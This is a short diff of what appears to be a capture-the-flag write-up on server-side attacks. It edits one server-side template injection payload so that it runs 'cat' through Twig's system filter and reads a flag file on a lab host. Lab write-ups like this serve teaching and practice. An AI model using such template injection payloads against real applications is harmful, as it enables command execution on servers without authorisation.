@@ -242,7 +242,7 @@ Notice that the application accepts user input to display the count on the scree
         alt="/images/htb-serverside-attack-10.png"
         title="/images/htb-serverside-attack-10.png" /></p>
 <p>Read the flag:</p>
-<p>Payload: <code>http://truckapi.htb/?id=FusionExpress03{{['ls${IFS}/flag.txt']|filter('system')}}</code></p>
+<p>Payload: <code>http://truckapi.htb/?id=FusionExpress03{{['cat${IFS}/flag.txt']|filter('system')}}</code></p>
 <p><img
         class="lazyload"
         src="/svg/loading.min.svg"
